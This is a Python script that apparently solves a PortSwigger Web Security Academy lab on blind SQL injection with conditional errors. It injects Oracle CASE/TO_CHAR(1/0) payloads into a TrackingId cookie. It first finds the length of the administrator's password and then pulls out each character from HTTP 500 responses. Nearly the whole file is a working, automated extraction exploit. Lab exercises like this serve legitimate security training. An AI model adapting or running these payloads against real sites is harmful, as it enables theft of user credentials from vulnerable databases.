#/usr/bin/python3

"""
The challenge:
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

Example usage:
python3 1-12-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"
"""

import requests, argparse, string

# parse command line arguments
parser = argparse.ArgumentParser(add_help=True, description='Example usage:\n $python3 1-12-SQLi.py -c "cPBMCPBMcpbmCPBMcpbmCPBMCPBMCPBM" -i "cPBMCPBMcpbmCPBM" -u "https://aeaeaeaeaeaeaeaeaeaeaeaeaeaeaeae.web-security-academy.net"')
parser.add_argument('-u', '--url', action='store', required=True, help='Enter the full url of the page', type=str)
parser.add_argument('-c', '--sessioncookie', action='store', required=True, help='Enter the session cookie value', type=str)
parser.add_argument('-i', '--trackingid', action='store', required=True, help='Enter the tracking ID cookie value', type=str)
args = parser.parse_args()
cookie = args.sessioncookie
id = args.trackingid
if str(args.url[-1]) == "/":
	host = args.url[:-1]
else:
	host = args.url

def testquery():
	#this one should be a 200 response
	query1 = "%27+ORDER+BY+1--"
	cookies1 = {'TrackingId':f"{id}{query1}", 'session':f"{cookie}"}
	url1 = f"{host}/"
	r1 = requests.request("GET", url=url1, cookies=cookies1)
	rc1 = r1.status_code

	#this one should throw an error
	query2 = "%27+ORDER+BY+300--"
	cookies2 = {'TrackingId':f"{id}{query2}", 'session':f"{cookie}"}
	url2 = f"{host}/"
	r2 = requests.request("GET", url=url2, cookies=cookies2)
	rc2 = r2.status_code

	return True if rc1 == 200 and rc2 == 500 else False

def getresponselength():
	url = f"{host}/"
	for i in range (1, 100):

		query = f"'||(SELECT CASE WHEN LENGTH(password)={i} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
		cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
		r = requests.request("GET", url=url, cookies=cookies)
		rc = r.status_code
		if rc == 500:
			return i

def getresponse(lr):
	url = f"{host}/"
	response = ""
	for i in range(1, lr+1):
		for char in string.digits + string.ascii_letters:
			query = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
			cookies = {'TrackingId':f"{id}{query}", 'session':f"{cookie}"}
			r = requests.request("GET", url=url, cookies=cookies)
			rc = r.status_code
			if rc == 500:
				response += char
				print(response)
	return response


#Lets gooo

# Test the validity of the sql query
if testquery() == False:
	print(f"\nDid not get the expected response codes. Maybe there is something wrong in the url or cookie parameters?")
	print(f"Here is the help menu:\n")
	parser.print_help()

else:
	print(" ~> looks like the injection works!")
	print(" ~> Length response: ")
	lr = getresponselength()
	print(" ~> " + str(lr) + "\n")
	print(" ~> herewego:\n")
	response = getresponse(lr)
	print("\n ~> Done! the result: ")
	print(str(response))
